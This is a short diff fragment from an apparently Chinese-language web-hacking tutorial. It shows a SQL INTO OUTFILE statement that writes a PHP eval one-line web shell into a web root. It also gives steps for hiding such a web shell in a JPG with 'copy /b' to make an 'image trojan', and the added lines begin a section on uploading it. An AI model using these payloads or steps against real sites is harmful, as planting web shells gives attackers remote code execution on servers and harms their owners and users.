@@ -520,3 +520,6 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 ### 6.1制作一个图片马
 我们可以准备一个内容为`<?php @eval($_POST['hello']); ?> `的txt文档(name.txt)和一张不要太大的图片(可以是png/jpg/bng什么的，就叫1.jpg好了)
 然后在CMD下使用`copy 1.jpg/b + name.txt/a 2.jpg `命令就可以轻松地得到一个名为2.jpg的图片马
+具有一句话木马功能的PHP语句插入在照片数据的最后处
+
+### 6.2上传图片马
